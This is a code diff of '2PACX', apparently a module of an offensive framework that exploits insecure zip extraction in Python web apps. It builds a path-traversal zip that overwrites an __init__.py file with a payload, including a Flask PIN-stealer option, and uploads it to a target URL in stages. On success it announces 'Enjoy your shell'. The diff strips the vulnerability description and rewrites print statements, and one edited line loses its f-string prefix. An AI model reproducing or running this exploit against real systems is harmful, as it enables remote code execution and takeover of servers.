@@ -29,52 +29,6 @@ import argparse
     
 
 class siddhi:  
-    module_information = collections.OrderedDict() 
-    module_information = {
-        "Name":         "2PACX",
-        "Info":         "Unsecure Zip File Extraction Exploit",
-        "Category":     "Package",
-        "Framework":    "Generic",
-        "Type":         "Exploit",
-        "Module":       "siddhis/2pacx/",
-        "Author":       "s4dhu <s4dhul4bs[at]prontonmail[dot]ch",
-        "Brief":        "Remote code execution via insecure file extraction", 
-        "Package":      "Zipfile",
-        "Description":  
-        """
-
-        \r  The vulnerability occurs when a zipped file is sent to a Python application 
-        \r  that uses the zipfile.ZipInfo() method from the zipfile[1] library to obtain 
-        \r  the information necessary to perform the server side extraction.
-
-        \r  In this scenario, an attacker can manipulate a specially created .zip file, 
-        \r  in which the filename (fileinfo.filename) is configured, via path traversal 
-        \r  (eg: '../config/__init__.py'), by setting an arbitrary location for record 
-        \r  the contents of the malicious zip file[2][3]. 
-        
-        \r  The goal of the exploit is to subscribe to the content of some __init__.py file 
-        \r  (zipfile.ZipInfo.writestr()) within any directory of the exploited application.
-
-        \r  Note that there are numerous particularities necessary for this flaw to be exploited, 
-        \r  one of which is the fact that the payload sent will only be executed immediately 
-        \r  in cases where the Python application (Flask/Django) is running with DEBUG true, 
-        \r  otherwise the payload will only be triggered when the server restarts.
-
-        \r  Another important point is that it is necessary that the directory specified 
-        \r  in the filename of the sent zip exists on the server with an __init__.py file.
-
-        \r  References:
-
-        \r  [1] https://docs.python.org/2/library/zipfile.html#zipfile.ZipInfo
-        \r  [2] https://ajinabraham.com/blog/exploiting-insecure-file-extraction-in-python-for-code-execution 
-        \r  [3] https://github.com/MobSF/Mobile-Security-Framework-MobSF/issues/358
-        """
-
-    }
-    
-    # help to 'args' command in main vimana board: vimana args --module dmt
-    module_arguments = VimanaSharedArgs().shared_help.__doc__
-
     def __init__(self, **vmnf_handler):
         self.vmnf_handler = vmnf_handler
         self.commom_py_app_dirs = [
@@ -93,17 +47,6 @@ class siddhi:
         return parser
 
     def build_malzipfile(self):
-        
-
-        '''
-        --target-url 
-        --target-dir
-        --local-port
-        --remote-port
-        --local-host
-        --filename 
-        --payload
-        '''
         forward_is_enabled = self.vmnf_handler.get('forward_session', False) 
 
         g = Generic()
@@ -191,7 +134,7 @@ class siddhi:
         else:
             filename = self.vmnf_handler['filename']
 
-        print("[{}] → Building malicious zipfile: {}.zip...".format(xpl_hl,filename))
+        print(f"[{xpl_hl}] → Building malicious zipfile: {filename}.zip...")
         sleep(1)
         
         payload = ('\n'*100 + str(payload))
@@ -202,14 +145,14 @@ class siddhi:
         z_info.external_attr = 0o777 << 16                  
         z_file.close()
         
-        print("[{}] → Uploading {} to {}...".format(xpl_hl,filename, self.vmnf_handler['target_url']))
+        print(f"[{xpl_hl}] → Uploading {filename} to {self.vmnf_handler['target_url']}...")
         sleep(1)
         
         if forward_is_enabled: 
-            print("[{}] → Forward is enabled, start {} in another terminal:\n\t vf run --module {} --session and hit Enter here.".format(
-                xpl_hl,forward_is_enabled,forward_is_enabled
-                )
-            )
+            print(f"""
+            [{xpl_hl}] → Forward enabled, start {forward_is_enabled} in another terminal:
+            vf run -m {forward_is_enabled} --session 2pacx and hit Enter here.
+            """)
             
             stager(**self.vmnf_handler).forward_session()
             s=input()
@@ -217,24 +160,21 @@ class siddhi:
         try:
             # stages were introduced to manage some new payloads:fps
             stages = 3 if payload_type == 'flask_pinstealer' else 2
+
             for stage in range(1,stages): 
-                print("[{}]   + Sending {} stage {}/{}...".format(
-                    xpl_hl,
-                    self.vmnf_handler['payload_type'],
-                    stage,
-                    stages - 1
-                    )
-                )
-                
+                print(f"[{xpl_hl}]   + Sending {self.vmnf_handler['payload_type']} stage {stage}/{stages - 1}...")
+            
                 sleep(10)
                 zip_ = open('/tmp/' + zip_file, 'rb')
                 files = {'file': zip_}
                 upload = requests.post(
-                self.vmnf_handler['target_url'],files=files)
+                    self.vmnf_handler['target_url'],
+                    files=files
+                )
+
         except requests.exceptions.ConnectionError:
             # maybe server is up or not running on a given port 
-            print("[{}] → Could not upload the exploit. Make sure that --target-url parameter is correct...".format(
-                    colored('2pacx','red')))
+            print("[{colored('2pacx','red')}] → Could not upload the exploit. Make sure that --target-url parameter is correct.")
             sys.exit(1)
 
         if upload.status_code == 200:
@@ -247,9 +187,10 @@ class siddhi:
                 
                 inf = colored(pws_url,'green')
 
-            print('[{}] → Success! Enjoy your shell: {}'.format(xpl_hl,inf))
+            print(f'[{xpl_hl}] → Success! Enjoy your shell: {inf}')
         else:
-            print('[{}] → It looks like something went wrong / The server responded with {}'.format(xpl_hl,upload.status_code))
+            print(f'[{xpl_hl}] → Something went wrong / The server responded with {upload.status_code}')
+            return False
 
     def start(self):
         # required argument for all available payloads
